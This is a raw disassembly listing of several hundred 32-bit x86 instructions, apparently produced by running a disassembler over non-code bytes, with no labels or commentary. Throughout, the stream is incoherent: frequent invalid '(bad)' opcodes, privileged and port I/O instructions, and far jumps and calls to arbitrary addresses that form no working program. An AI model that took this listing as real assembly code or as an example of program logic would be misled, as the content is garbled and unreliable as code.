  419e54:	push   esi
  419e55:	pop    esp
  419e56:	cs out dx,eax
  419e58:	lock dec edx
  419e5a:	xchg   DWORD PTR [esi-0x5cbf75e2],ebp
  419e60:	pop    ecx
  419e61:	mov    edi,0x4339447f
  419e66:	add    ebx,DWORD PTR [ebp-0x6a5a54bf]
  419e6c:	cdq    
  419e6d:	fistp  WORD PTR [esi+0x7d]
  419e71:	sbb    DWORD PTR [ecx-0x52228fd1],edi
  419e77:	jno    0x419ea4
  419e79:	(bad)  
  419e7a:	jmp    0x44e08359
  419e7f:	nop
  419e80:	ret    0xe4b1
  419e83:	add    DWORD PTR [ebx],edi
  419e85:	push   esi
  419e86:	jmp    0xb968:0xee17f465
  419e8d:	xlat   BYTE PTR ds:[ebx]
  419e8e:	jp     0x419eec
  419e90:	pop    ss
  419e91:	rcl    BYTE PTR [edx-0x13465f2c],1
  419e97:	stos   DWORD PTR es:[edi],eax
  419e98:	(bad)  [esi+0x5d02fd54]
  419e9e:	test   BYTE PTR [eax],ah
  419ea0:	mov    ecx,0x6fa03b21
  419ea5:	sbb    dl,BYTE PTR [esi-0x55]
  419ea8:	fs pop ds
  419eaa:	data16 arpl sp,cx
  419ead:	xchg   ebp,eax
  419eae:	icebp  
  419eaf:	xchg   ecx,eax
  419eb0:	push   ecx
  419eb1:	aaa    
  419eb2:	and    dh,bh
  419eb4:	inc    esi
  419eb6:	mov    edx,0x3703ffe6
  419ebb:	jl     0x419f03
  419ebd:	sbb    al,0x17
  419ebf:	(bad)  
  419ec1:	pop    ds
  419ec2:	in     eax,0xcb
  419ec4:	addr16 inc eax
  419ec6:	retf   0xe29a
  419ec9:	pop    edx
  419eca:	cmp    DWORD PTR [esi-0x550ac996],eax
  419ed0:	stos   DWORD PTR es:[edi],eax
  419ed1:	rcl    esp,0xc4
  419ed4:	pop    ecx
  419ed5:	push   eax
  419ed6:	jmp    0x9416:0xff19803e
  419edd:	sub    WORD PTR [ebx+0xa3c16dc],0x63
  419ee5:	push   ebp
  419ee6:	clc    
  419ee7:	dec    esp
  419ee8:	pop    esi
  419ee9:	mov    ah,BYTE PTR [ecx-0x6eea4f5]
  419eef:	sub    BYTE PTR [ebx+0x4],ch
  419ef2:	xor    esi,ebp
  419ef4:	mov    ah,0xd8
  419ef6:	ins    BYTE PTR es:[edi],dx
  419ef7:	jg     0x419f18
  419ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419efa:	test   eax,0xc46decae
  419eff:	cli    
  419f00:	pop    ds
  419f01:	call   0x79757cc6
  419f06:	mov    esp,0xdba37fc7
  419f0b:	dec    edx
  419f0c:	ja     0x419ea9
  419f0e:	jne    0x419ede
  419f10:	and    edi,DWORD PTR [edi*4+0x79a1682a]
  419f17:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f19:	fdivr  DWORD PTR [edx+0x6230de13]
  419f1f:	cmp    al,0x59
  419f21:	iret   
  419f22:	push   0x8981d617
  419f27:	repz mov bh,0xb8
  419f2a:	hlt    
  419f2b:	xchg   edi,eax
  419f2c:	push   edx
  419f2d:	mul    BYTE PTR [edx-0x24]
  419f30:	mov    ds:0xac7ba949,eax
  419f35:	inc    esi
  419f36:	jne    0x419eca
  419f38:	jnp    0x419f3a
  419f3a:	mov    cl,0xc6
  419f3c:	xchg   esp,eax
  419f3d:	inc    ebx
  419f3e:	in     eax,0xa2
  419f40:	and    BYTE PTR [eax],bh
  419f42:	dec    ebp
  419f43:	cmp    ch,BYTE PTR [edi+esi*8]
  419f46:	mov    bh,0xff
  419f48:	imul   esi,DWORD PTR gs:[ecx-0x27],0x77fa7ef9
  419f50:	frstor [esi]
  419f52:	jbe    0x419f6c
  419f54:	xchg   ebx,eax
  419f55:	or     eax,0xea31a434
  419f5a:	ret    
  419f5b:	out    dx,al
  419f5c:	sbb    DWORD PTR [esi+0x64],esi
  419f5f:	hlt    
  419f60:	dec    esi
  419f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f62:	ret    0xcb01
  419f65:	jecxz  0x419fe5
  419f67:	pop    ecx
  419f68:	xchg   ebx,eax
  419f69:	xor    esp,esi
  419f6b:	dec    ebp
  419f6c:	jle    0x419efa
  419f6e:	mov    ebx,0xda7c8c20
  419f73:	dec    edx
  419f74:	jecxz  0x419fdf
  419f76:	fisubr DWORD PTR [ebx+0x6f]
  419f79:	mov    al,al
  419f7b:	shl    BYTE PTR [esi-0x32],0x90
  419f7f:	jne    0x419f73
  419f81:	and    DWORD PTR [ebp-0x37],eax
  419f84:	fs and al,0x6a
  419f87:	int    0xa8
  419f89:	(bad)  
  419f8b:	pop    edi
  419f8c:	into   
  419f8d:	sahf   
  419f8e:	loop   0x419f92
  419f90:	add    esi,eax
  419f92:	leave  
  419f93:	cs mov cs,ebx
  419f96:	(bad)  
  419f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f98:	sbb    eax,0xee0550a6
  419f9d:	fisub  WORD PTR [ecx+0x40e6b522]
  419fa3:	xchg   ebp,eax
  419fa4:	fmulp  st(0),st
  419fa6:	hlt    
  419fa7:	lea    ebp,[edi-0x5d]
  419faa:	cmp    BYTE PTR [eax],al
  419fac:	lahf   
  419fad:	jo     0x419fd8
  419faf:	jne    0x419f40
  419fb1:	mov    al,ds:0x8bd805f3
  419fb6:	or     ah,dl
  419fb8:	inc    ebp
  419fb9:	fidivr WORD PTR [ebx+ebx*8+0x24]
  419fbd:	shr    edx,1
  419fbf:	dec    DWORD PTR [edi-0x74]
  419fc2:	xor    al,0x25
  419fc4:	clc    
  419fc5:	(bad)  
  419fc6:	gs xor ebx,ecx
  419fc9:	mov    ds:0x6e8f97be,al
  419fce:	jecxz  0x41a005
  419fd0:	cld    
  419fd1:	dec    ebp
  419fd2:	mov    ebp,0xf9b9621e
  419fd7:	mov    DWORD PTR [esp+edi*8+0x35],ebp
  419fdb:	lock push 0x48
  419fde:	mov    esp,0xf027cf3
  419fe3:	lahf   
  419fe4:	int3   
  419fe5:	inc    eax
  419fe6:	in     eax,dx
  419fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe8:	sbb    edx,DWORD PTR [ecx+edi*2]
  419feb:	add    DWORD PTR [eax-0x7a],ecx
  419fee:	sbb    BYTE PTR [esi],dh
  419ff0:	stos   BYTE PTR es:[edi],al
  419ff1:	js     0x419fef
  419ff3:	inc    esi
  419ff4:	test   BYTE PTR [eax-0x5c9f8817],dl
  419ffa:	mov    bh,0x3e
  419ffc:	das    
  419ffd:	pop    edi
  419ffe:	pop    edi
  419fff:	mov    BYTE PTR [ebx+0x4e],ch
  41a002:	loopne 0x419fe8
  41a004:	iret   
  41a005:	ret    
  41a006:	bound  ebx,QWORD PTR [edx+0x54]
  41a009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a00a:	adc    eax,0x298b34c8
  41a00f:	and    eax,0xfc703822
  41a014:	pop    edi
  41a015:	(bad)
  41a018:	dec    ebx
  41a019:	nop
  41a01a:	fprem1 
  41a01c:	dec    edx
  41a01d:	(bad)  
  41a01f:	not    BYTE PTR [edx+0x2ddd1b4b]
  41a025:	or     BYTE PTR [ebx],0xf0
  41a028:	int    0xbb
  41a02a:	pop    ebx
  41a02b:	dec    esi
  41a02c:	xchg   ebp,eax
  41a02d:	jo     0x41a04b
  41a02f:	pushf  
  41a030:	xchg   edx,eax
  41a031:	xchg   BYTE PTR [edx-0x1e47ab60],bl
  41a037:	or     BYTE PTR [esp+ebx*1-0x30],bh
  41a03b:	mov    ds:0xbad8e39f,eax
  41a040:	outs   dx,BYTE PTR ds:[esi]
  41a041:	loope  0x41a012
  41a043:	idiv   BYTE PTR [ecx+ecx*1-0x4a]
  41a047:	lods   al,BYTE PTR ds:[esi]
  41a048:	adc    cl,BYTE PTR [edi]
  41a04a:	push   es
  41a04b:	sub    cl,dl
  41a04d:	aad    0x28
  41a04f:	les    esi,FWORD PTR [edi]
  41a051:	pushf  
  41a052:	outs   dx,DWORD PTR ds:[esi]
  41a053:	gs (bad) 
  41a055:	stos   DWORD PTR es:[edi],eax
  41a056:	cmovle ebp,ebx
  41a059:	fs jne 0x41a0b9
  41a05c:	std    
  41a05d:	mov    edi,0x3cc6cc62
  41a062:	ds dec ecx
  41a064:	cld    
  41a065:	mov    WORD PTR [edi],fs
  41a067:	stc    
  41a068:	add    eax,0xffb66c2a
  41a06d:	jae    0x41a01a
  41a06f:	test   al,0x6b
  41a071:	push   edx
  41a072:	jl     0x41a033
  41a074:	imul   ebx,DWORD PTR [esi-0x4a],0xffffffba
  41a078:	dec    edx
  41a079:	sbb    al,BYTE PTR [ecx-0x2c]
  41a07c:	cmc    
  41a07d:	imul   edi,DWORD PTR [ebp+ecx*8+0x0],0xffffffaa
  41a082:	inc    ebp
  41a083:	icebp  
  41a084:	call   0x30b6:0x80af4dd4
  41a08b:	push   ebp
  41a08c:	into   
  41a08d:	push   es
  41a08e:	and    eax,0xbc59bcb6
  41a093:	inc    ebp
  41a094:	mov    ecx,0x18d2dfad
  41a099:	popf   
  41a09a:	jg     0x41a0ed
  41a09c:	inc    edx
  41a09d:	sub    eax,0x4b71ecdf
  41a0a2:	inc    edx
  41a0a3:	push   edi
  41a0a4:	cmp    al,0x0
  41a0a6:	fs sub eax,0xc84351a6
  41a0ac:	dec    edx
  41a0ad:	jmp    FWORD PTR [edx+ecx*2]
  41a0b0:	jnp    0x41a0b5
  41a0b2:	inc    edi
  41a0b3:	call   0xd591cc78
  41a0b8:	pushf  
  41a0b9:	jb     0x41a094
  41a0bb:	sub    eax,0xce781808
  41a0c0:	ds je  0x41a052
  41a0c3:	inc    esi
  41a0c4:	pop    esi
  41a0c5:	push   esi
  41a0c6:	repz add BYTE PTR [ecx],dh
  41a0c9:	mov    dl,0xa7
  41a0cb:	je     0x41a087
  41a0cd:	dec    edi
  41a0ce:	mov    al,ds:0xf7dc342d
  41a0d3:	(bad)  
  41a0d4:	std    
  41a0d5:	sub    edi,DWORD PTR [eax]
  41a0d7:	pop    edi
  41a0d8:	(bad)  
  41a0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0da:	xor    ch,BYTE PTR [edx+0x6b]
  41a0dd:	dec    eax
  41a0de:	dec    esi
  41a0df:	mov    al,0x3a
  41a0e1:	dec    edi
  41a0e2:	push   ss
  41a0e3:	call   0xae4d:0x6a60b2ea
  41a0ea:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0ec:	lock mov eax,0xaff520d
  41a0f2:	stos   DWORD PTR es:[edi],eax
  41a0f3:	push   es
  41a0f4:	pop    esi
  41a0f5:	lahf   
  41a0f6:	ins    DWORD PTR es:[edi],dx
  41a0f7:	push   edx
  41a0f8:	div    DWORD PTR ds:0xb7804c5d
  41a0fe:	mov    eax,ds:0xdb33a91
  41a103:	pop    esi
  41a104:	adc    ecx,DWORD PTR [esi-0x14]
  41a107:	xchg   esp,eax
  41a108:	ror    BYTE PTR [ebp+0x5c],1
  41a10b:	loop   0x41a099
  41a10d:	jnp    0x41a0c5
  41a10f:	mov    dh,0xab
  41a111:	test   BYTE PTR [edi-0x70],ch
  41a114:	push   ebp
  41a115:	jge    0x41a119
  41a117:	jp     0x41a17a
  41a119:	shr    dh,1
  41a11b:	inc    ecx
  41a11c:	int3   
  41a11d:	sbb    ecx,DWORD PTR [ebx+0x57441168]
  41a123:	stos   BYTE PTR es:[edi],al
  41a124:	pop    ds
  41a125:	ss loop 0x41a15b
  41a128:	les    ecx,FWORD PTR [ebx+0x23]
  41a12b:	test   BYTE PTR [eax],dh
  41a12d:	mov    ebx,0xea18b7b7
  41a132:	bound  ebp,QWORD PTR [edi+0x3fada937]
  41a138:	(bad)  
  41a139:	mov    eax,ds:0x6f34b73
  41a13e:	jns    0x41a190
  41a140:	aad    0xb4
  41a142:	daa    
  41a143:	adc    cl,BYTE PTR [esi+edx*8]
  41a146:	(bad)  
  41a147:	sub    al,0xc6
  41a149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14a:	dec    ecx
  41a14b:	rcr    ch,cl
  41a14d:	mov    dl,0xb0
  41a14f:	aas    
  41a150:	mov    esi,DWORD PTR [ebx]
  41a152:	popa   
  41a153:	ror    esp,cl
  41a155:	sti    
  41a156:	xor    eax,0x38c28343
  41a15b:	xor    BYTE PTR [ebx+0x32bb9ce9],ch
  41a161:	inc    esp
  41a162:	arpl   WORD PTR [edx-0x7bbaa129],sp
  41a168:	iret   
  41a169:	shl    DWORD PTR [edx],0x5d
  41a16c:	iret   
  41a16d:	mov    bh,0x4
  41a16f:	xchg   ebx,eax
  41a170:	enter  0xaee9,0xf0
  41a174:	mov    DWORD PTR [ebx-0x6e6f6eed],esp
  41a17a:	ja     0x41a1f2
  41a17c:	dec    esi
  41a17d:	cdq    
  41a17e:	adc    ebp,DWORD PTR gs:[edx+0x67ee86b9]
  41a185:	push   ebp
  41a186:	inc    edx
  41a187:	and    DWORD PTR [esi+0x60],esp
  41a18a:	sbb    eax,0xfe604e95
  41a18f:	sbb    DWORD PTR [esi+eax*4+0x13ab92cb],ebp
  41a196:	xor    al,dh
  41a198:	in     al,0x54
  41a19a:	int3   
  41a19b:	add    DWORD PTR [edi],esi
  41a19d:	cmc    
  41a19e:	(bad)  
  41a19f:	in     eax,0x3a
  41a1a1:	and    al,0x42
  41a1a3:	pop    ss
  41a1a4:	pop    esi
  41a1a5:	int3   
  41a1a6:	cmp    eax,0xb38025e0
  41a1ab:	jmp    0x6d5a0f16
  41a1b0:	test   BYTE PTR [edx-0x47],dl
  41a1b3:	cmp    ebx,edi
  41a1b5:	outs   dx,BYTE PTR ds:[esi]
  41a1b6:	pop    ecx
  41a1b7:	push   edi
  41a1b8:	maskmovq mm3,(bad)
  41a1b9:	neg    DWORD PTR [edi+edi*2+0xa]
  41a1bd:	dec    edx
  41a1be:	mov    esi,0x4e66c01e
  41a1c3:	cwde   
  41a1c4:	loop   0x41a22a
  41a1c6:	adc    BYTE PTR [ebx],ah
  41a1c8:	cmp    al,0xd
  41a1ca:	mov    cs,WORD PTR [eax+0x13e83da2]
  41a1d0:	dec    edx
  41a1d1:	cmc    
  41a1d2:	ins    DWORD PTR es:[edi],dx
  41a1d3:	loop   0x41a168
  41a1d5:	lahf   
  41a1d6:	jb     0x41a160
  41a1d8:	in     al,0x80
  41a1da:	retf   0xd70
  41a1dd:	shr    DWORD PTR [edi+0x4c],0xa9
  41a1e1:	nop
  41a1e2:	xor    al,0x64
  41a1e4:	data16 fwait
  41a1e6:	mov    WORD PTR [eax+0x30],?
  41a1e9:	jo     0x41a1f1
  41a1eb:	push   edx
  41a1ec:	and    DWORD PTR [edi-0x50],ecx
  41a1ef:	and    al,0x60
  41a1f1:	fcmovnu st,st(6)
  41a1f3:	jnp    0x41a1c8
  41a1f5:	cmp    cl,cl
  41a1f7:	outs   dx,BYTE PTR ds:[esi]
  41a1f8:	sub    al,0xa8
  41a1fa:	or     BYTE PTR [eax],al
  41a1fc:	mov    es,WORD PTR [ecx]
  41a1fe:	xchg   DWORD PTR [edi+0x506bcd1],ebx
  41a204:	mov    ebx,0x637bedc2
  41a209:	test   eax,0x7ebaff54
  41a20e:	(bad)  
  41a20f:	push   edi
  41a210:	mov    edx,0x3eda10ae
  41a215:	push   es
  41a216:	jb     0x41a20e
  41a218:	cmp    DWORD PTR [ebp-0x58],edi
  41a21b:	test   DWORD PTR [edx+0x8851c12],eax
  41a221:	dec    esp
  41a222:	add    ch,al
  41a224:	clc    
  41a225:	jne    0x41a237
  41a227:	int3   
  41a228:	or     BYTE PTR [ecx+0x4a],0xd5
  41a22c:	xor    bh,al
  41a22e:	shr    BYTE PTR [eax],0x2c
  41a231:	call   0xb066:0x64a45041
  41a238:	adc    eax,0x2611a2d5
  41a23d:	call   0xcab45b6d
  41a242:	mov    ds:0x505fdde6,eax
  41a247:	popf   
  41a248:	pop    bx
  41a24a:	(bad)  
  41a24c:	repz jmp FWORD PTR [ebx+0x192834e2]
  41a253:	pop    ss
  41a254:	ss retf 
  41a256:	fst    DWORD PTR [ebx+edx*2+0x66c8efaf]
  41a25d:	or     edi,DWORD PTR [eax+edi*4-0x6]
  41a261:	test   BYTE PTR [esp+esi*8],dl
  41a264:	mul    DWORD PTR [esi]
  41a266:	stos   BYTE PTR es:[edi],al
  41a267:	xchg   ecx,eax
  41a268:	or     BYTE PTR [ecx],ch
  41a26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a26b:	cmp    esi,esp
  41a26d:	or     edx,DWORD PTR [edx+0x31]
  41a270:	cwde   
  41a271:	lds    ebp,FWORD PTR ds:0x1f5a25ad
  41a277:	jae    0x41a28c
  41a279:	mov    edi,ecx
  41a27b:	mov    ebp,0xc2c6ce5f
  41a280:	std    
  41a281:	and    al,0x69
  41a283:	call   0xfc955fae
  41a288:	inc    ebp
  41a289:	push   edi
  41a28a:	sbb    esi,DWORD PTR ds:0xc69b1b59
  41a290:	lahf   
  41a291:	inc    ecx
  41a292:	mov    WORD PTR [eax-0x792d7419],gs
  41a298:	je     0x41a292
  41a29a:	in     eax,0xe3
  41a29c:	or     eax,0x26e228a9
  41a2a1:	cmp    eax,0x47de9f36
  41a2a6:	jno    0x41a304
  41a2a8:	xor    eax,0x148194bb
  41a2ad:	sbb    BYTE PTR [edi],bl
  41a2af:	mov    ss:0x857f2c4a,al
  41a2b5:	icebp  
  41a2b6:	(bad)  
  41a2b7:	sub    eax,0x330ff20c
  41a2bc:	aas    
  41a2bd:	jg     0x41a33b
  41a2bf:	jmp    0x6a114632
  41a2c4:	xchg   esi,eax
  41a2c5:	or     dl,ch
  41a2c7:	retf   0x6138
  41a2ca:	outs   dx,BYTE PTR ds:[esi]
  41a2cb:	icebp  
  41a2cc:	inc    edx
  41a2cd:	rol    DWORD PTR [ecx+0x4d9445],0xda
  41a2d4:	mov    al,ds:0x49e5d85c
  41a2d9:	ins    DWORD PTR es:[edi],dx
  41a2da:	mov    BYTE PTR [eax-0x39],cl
  41a2dd:	jge    0x41a312
  41a2df:	imul   esi,DWORD PTR ds:0x775b1b55,0xf05a5fe0
  41a2e9:	mov    esi,0xa9274dd3
  41a2ee:	inc    ebx
  41a2ef:	push   esi
  41a2f0:	je     0x41a34d
  41a2f2:	mov    WORD PTR [ecx+0x3a],ds
  41a2f5:	sti    
  41a2f6:	retf   0x69c2
  41a2f9:	sbb    eax,0xbdc71ae9
  41a2fe:	mov    WORD PTR [ebx+0x18],ds
  41a301:	ja     0x41a28d
  41a303:	inc    edi
  41a304:	pop    ebp
  41a305:	das    
  41a306:	aas    
  41a307:	stos   BYTE PTR es:[edi],al
  41a308:	adc    esi,DWORD PTR [edx]
  41a30a:	mov    esi,0x8b5ca6b
  41a30f:	ja     0x41a2a0
  41a311:	mov    dh,0x42
  41a313:	mov    cl,0xfb
  41a315:	or     DWORD PTR [edi-0x37],0xffffffbe
  41a319:	inc    esi
  41a31a:	pop    esi
  41a31b:	out    0x9a,eax
  41a31d:	inc    eax
  41a31e:	call   0xe28a4340
  41a323:	adc    al,0x28
  41a325:	mov    dl,0x89
  41a327:	xor    BYTE PTR [ecx-0x7d5cd3b4],al
  41a32d:	and    DWORD PTR ds:0x9cb3f1b6,ecx
  41a333:	lock ja 0x41a2e9
  41a336:	pop    ecx
  41a337:	lds    eax,FWORD PTR [ecx+0x6e13a528]
  41a33d:	mov    bh,0x1c
  41a33f:	xor    eax,0xea47faba
  41a344:	dec    eax
  41a345:	mov    bh,dl
  41a347:	out    0xaf,al
  41a349:	pushf  
  41a34a:	jmp    0xba04f93e
  41a34f:	push   ss
  41a350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a351:	jl     0x41a386
  41a353:	pop    es
  41a354:	arpl   WORD PTR [ebx-0x740c37b4],dx
  41a35a:	pop    esi
  41a35b:	inc    esp
  41a35c:	int3   
  41a35d:	aad    0xda
  41a35f:	retf   
  41a360:	adc    DWORD PTR [ebp+0x22],0x495e9ea5
  41a367:	es rcl ebx,cl
  41a36a:	fild   DWORD PTR [edx-0x74926ad1]
  41a370:	xor    eax,DWORD PTR [eax+0x5]
  41a373:	ins    BYTE PTR es:[edi],dx
  41a374:	pop    eax
  41a375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a376:	adc    al,BYTE PTR [ecx]
  41a378:	scas   al,BYTE PTR es:[edi]
  41a379:	mov    eax,0x584733c8
  41a37e:	neg    ecx
  41a380:	mov    ds:0xe5867ad5,eax
  41a385:	push   esp
  41a386:	(bad)  
  41a387:	scas   eax,DWORD PTR es:[edi]
  41a388:	push   es
  41a389:	shl    ah,cl
  41a38b:	retf   
  41a38c:	ja     0x41a36d
  41a38e:	adc    BYTE PTR [edi+eax*1],0xdc
  41a392:	fstp   QWORD PTR [eax-0x3e]
  41a395:	stc    
  41a396:	or     DWORD PTR [ebp-0x80],edx
  41a399:	(bad)  
  41a39a:	cld    
  41a39b:	ds push edi
  41a39d:	jg     0x41a321
  41a39f:	sbb    al,0xfb
  41a3a1:	push   0x74
  41a3a3:	int3   
  41a3a4:	sahf   
  41a3a5:	pushf  
  41a3a6:	pushf  
  41a3a7:	pop    ss
  41a3a8:	push   esi
  41a3a9:	cs pop ebx
  41a3ab:	mov    bh,0x42
  41a3ad:	mov    ebx,0x3fa9a2d8
  41a3b2:	int    0xb8
  41a3b4:	ficomp WORD PTR [ecx+eax*2+0x56a7d3aa]
  41a3bb:	jbe    0x41a393
  41a3bd:	push   0x36
  41a3bf:	pop    ss
  41a3c0:	mov    al,ds:0xd22e461b
  41a3c5:	loopne 0x41a43c
  41a3c7:	add    DWORD PTR [esp+esi*4-0xf],edx
  41a3cb:	test   BYTE PTR [eax],dh
  41a3cd:	in     eax,0xd4
  41a3cf:	addr16 ret 
  41a3d1:	mov    cl,BYTE PTR [esi+0x6b9d1bf8]
  41a3d7:	ins    BYTE PTR es:[edi],dx
  41a3d8:	mov    ah,0xd6
  41a3da:	test   BYTE PTR [edi-0x6a9b37b1],0x9a
  41a3e1:	jbe    0x41a374
  41a3e3:	mov    eax,ds
  41a3e5:	(bad)  
  41a3e7:	lea    esi,ds:0xeb1b9b60
  41a3ed:	sub    BYTE PTR ds:0xa8721b1f,ah
  41a3f3:	jl     0x41a45c
  41a3f5:	mov    al,ds:0xdb3734ca
  41a3fa:	aaa    
  41a3fb:	jbe    0x41a472
  41a3fd:	ja     0x41a45b
  41a3ff:	pusha  
  41a400:	fidivr WORD PTR [edi-0x52a632be]
  41a406:	shl    DWORD PTR fs:[ecx-0x63],cl
  41a40a:	or     eax,ebp
  41a40c:	scas   eax,DWORD PTR es:[edi]
  41a40d:	sar    ecx,cl
  41a40f:	pop    edx
  41a410:	sub    eax,0xbf781953
  41a415:	jo     0x41a3f0
  41a417:	push   esp
  41a418:	mov    eax,0x85c146a3
  41a41d:	jns    0x41a47b
  41a41f:	mov    edx,0x69b0abf6
  41a424:	mov    dh,0x53
  41a426:	int    0x56
  41a428:	push   edx
  41a429:	mov    DWORD PTR [ecx-0x14],edi
  41a42c:	scas   eax,DWORD PTR es:[edi]
  41a42d:	xchg   esp,eax
  41a42e:	shr    BYTE PTR [edi],0x1d
  41a431:	aas    
  41a432:	repnz (bad) 
  41a434:	in     al,dx
  41a435:	out    0xdc,eax
  41a437:	dec    edi
  41a438:	shl    DWORD PTR [esi-0x30],cl
  41a43b:	test   DWORD PTR [edi],eax
  41a43d:	fs sbb dl,dh
  41a440:	or     edx,edi
  41a442:	push   ss
  41a443:	mov    ecx,0xda1b2eb8
  41a448:	and    ah,dh
  41a44a:	ins    DWORD PTR es:[edi],dx
  41a44b:	mov    al,ds:0x6e5a277a
  41a450:	(bad)  
  41a452:	mov    ebx,0x878be34c
  41a457:	fsub   DWORD PTR [bx-0x66ed]
  41a45c:	dec    ebx
  41a45d:	push   es
  41a45e:	cmp    DWORD PTR [eax-0x7f],0xf4193293
  41a465:	imul   esi,DWORD PTR [eax+0x1c],0x398d869b
  41a46c:	or     eax,0x7900ff3f
  41a471:	push   eax
  41a472:	dec    esp
  41a473:	call   0x3484435d
  41a478:	mov    cl,0x54
  41a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47b:	outs   dx,BYTE PTR ds:[esi]
  41a47c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a47e:	xor    eax,0x839ed9a4
  41a483:	aam    0x46
  41a485:	stos   DWORD PTR es:[edi],eax
  41a486:	mov    ch,0x20
  41a488:	les    esi,FWORD PTR ds:0x8b65076
  41a48e:	(bad)  
  41a48f:	aad    0xa5
  41a491:	push   cs
  41a492:	xlat   BYTE PTR ds:[ebx]
  41a493:	or     ebp,edi
  41a495:	in     eax,0x48
  41a497:	daa    
  41a498:	enter  0x25cf,0xed
  41a49c:	xchg   BYTE PTR [esi],dl
  41a49e:	aas    
  41a49f:	xor    ebx,DWORD PTR [esi+0x2a]
  41a4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4a3:	sub    edi,DWORD PTR [ecx-0x52]
  41a4a6:	loop   0x41a491
  41a4a8:	int3   
  41a4a9:	(bad)
  41a4ad:	cld    
  41a4ae:	push   ebp
  41a4af:	mov    cl,BYTE PTR [eax+0x73]
  41a4b2:	cmp    ebx,DWORD PTR [ebx+0x1c56786]
  41a4b8:	mov    WORD PTR [ecx-0x21a902bc],ds
  41a4be:	push   edi
  41a4bf:	xchg   edx,eax
  41a4c0:	dec    BYTE PTR [ecx]
  41a4c2:	(bad)  
  41a4c3:	pushf  
  41a4c4:	mov    ah,0x23
  41a4c6:	dec    ebp
  41a4c7:	addr16 cwde 
  41a4c9:	and    DWORD PTR [ecx+0x550487b1],edi
  41a4cf:	sbb    eax,DWORD PTR [edi]
  41a4d1:	xor    edi,DWORD PTR [ebx]
  41a4d3:	or     eax,0x78deadf1
  41a4d8:	fs loopne 0x41a50a
  41a4db:	jne    0x41a4a7
  41a4dd:	and    al,BYTE PTR [ecx]
  41a4df:	and    esp,DWORD PTR [ebx*2+0x7e009ce]
  41a4e6:	jmp    0x1ccc:0x41ee69d7
  41a4ed:	dec    edx
  41a4ee:	shr    BYTE PTR [edi+0x55],1
  41a4f1:	ret    
  41a4f2:	sbb    DWORD PTR [ebx],esp
  41a4f4:	xlat   BYTE PTR ds:[ebx]
  41a4f5:	mov    edx,0x9b723b4f
  41a4fa:	or     eax,0xaa74b851
  41a4ff:	imul   esi,DWORD PTR [eax+ecx*8],0xffffff86
  41a503:	arpl   WORD PTR [edi+ebp*2],cx
  41a506:	test   BYTE PTR [eax+0x5],ah
  41a509:	or     eax,0x4bc1a397
  41a50e:	sar    al,0xc0
  41a511:	xchg   ebx,eax
  41a512:	es aam 0x37
  41a515:	dec    ebx
  41a516:	mov    ecx,0xfb18abc2
  41a51b:	into   
  41a51c:	cmp    bh,BYTE PTR [ebp-0xc6a26bf]
  41a522:	ret    
  41a523:	and    DWORD PTR [eax+0x6],0x21774acb
  41a52a:	int    0x3f
  41a52c:	xchg   ebx,eax
  41a52d:	xor    DWORD PTR [eax+0x7],ebp
  41a530:	pop    ds
  41a531:	xlat   BYTE PTR ds:[ebx]
  41a532:	es xchg edi,eax
  41a534:	pop    eax
  41a535:	push   cs
  41a536:	cmp    eax,0xbfb115af
  41a53b:	push   edi
  41a53c:	cmp    eax,0x133a98de
  41a541:	fisubr DWORD PTR [eax-0x23d07a03]
  41a547:	xchg   ecx,eax
  41a548:	inc    ebp
  41a549:	and    dl,ch
  41a54b:	mov    dh,0x6a
  41a54d:	int3   
  41a54e:	cmp    DWORD PTR [ecx],0xc6512e6
  41a554:	aam    0x72
  41a556:	push   esp
  41a557:	cs ret 0xa7c
  41a55b:	sub    ecx,edi
  41a55d:	mov    bl,0x98
  41a55f:	jg     0x41a4f9
  41a561:	pop    ecx
  41a562:	(bad)  
  41a563:	hlt    
  41a564:	sbb    BYTE PTR [ebx+0x1ce964ec],0x3
  41a56b:	lods   al,BYTE PTR ds:[esi]
  41a56c:	mov    ds:0xc3365cfd,eax
  41a571:	inc    esp
  41a572:	mov    edi,0x9ecfdbf
  41a577:	shl    BYTE PTR [edx-0x1c83a02d],1
  41a57d:	shl    DWORD PTR [ecx],cl
  41a57f:	clc    
  41a580:	fild   WORD PTR [eax-0x3d]
  41a583:	add    BYTE PTR [edi+0x4e],bl
  41a586:	jbe    0x41a5fd
  41a588:	push   edi
  41a589:	fisub  WORD PTR [edx+ecx*2-0x5e]
  41a58d:	mov    eax,ds:0xdc0e5d2
  41a592:	mov    ebx,0xa69fdd8c
  41a597:	or     cl,BYTE PTR [eax-0x69]
  41a59a:	test   BYTE PTR [ecx-0x47],ah
  41a59d:	jp     0x41a547
  41a59f:	mov    cl,0xac
  41a5a1:	adc    DWORD PTR [ebx],ecx
  41a5a3:	mov    esp,0xc3751bc6
  41a5a8:	sar    BYTE PTR [ebx],1
  41a5aa:	mov    ds:0x11041be3,al
  41a5af:	cmp    ebx,esp
  41a5b1:	push   esi
  41a5b2:	cmc    
  41a5b3:	pop    edi
  41a5b4:	push   edx
  41a5b5:	and    BYTE PTR [edi],bh
  41a5b7:	or     BYTE PTR [edi-0x61],al
  41a5ba:	(bad)  
  41a5bc:	sub    BYTE PTR [ebx+0x55c69982],0x8f
  41a5c3:	scas   al,BYTE PTR es:[edi]
  41a5c4:	push   ss
  41a5c5:	add    eax,0x338f5261
  41a5ca:	repnz into 
  41a5cc:	mov    bl,0x5e
  41a5ce:	cmc    
  41a5cf:	cs in  eax,0xb8
  41a5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
